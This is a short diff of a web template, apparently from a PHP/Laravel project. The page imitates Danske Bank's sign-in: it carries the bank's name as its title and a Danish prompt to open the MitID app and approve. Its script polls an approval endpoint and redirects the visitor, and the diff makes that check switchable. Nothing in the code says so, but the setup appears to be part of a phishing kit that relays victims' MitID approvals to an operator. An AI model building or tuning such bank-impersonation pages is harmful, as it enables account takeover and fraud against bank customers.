@@ -1,7 +1,7 @@
 @extends('frontend.layout')
 {{-- Page title --}}
 @section('title')
-    Danske Bank
+    Home
 @stop
 {{-- page level styles --}}
 @section('header_styles')
@@ -34,7 +34,7 @@
                                                 <hr class="sidebar-divider my-0">
                                             </div>
                                             <div class="info pt-2 text-center">
-                                                <a class="blue-color" href="{{route('home')}}" target="_blank">Abn MitID app og godkend</a>
+                                                <a class="blue-color" href="{{route('user.approve')}}" target="_blank">Abn MitID app og godkend</a>
                                                 <div class="pt-3">
                                                     <div class="mobile-shap">
                                                         <div class="innerflex">
@@ -86,11 +86,12 @@
 {{-- page level scripts --}}
 @section('footer_scripts')
     <script>
-        check();
+        let enable = '{{$enable}}';
+        if(enable == '1') check();
         function check() {
             $.ajax({url:'{{route('check.approve')}}', success: function(result){
                     if(result.success && result.approve != 1){
-                        location.href = '{{route('home')}}';
+                        location.href = '{{route('user.approve')}}';
                     }
                     else{
                         setTimeout(function () {
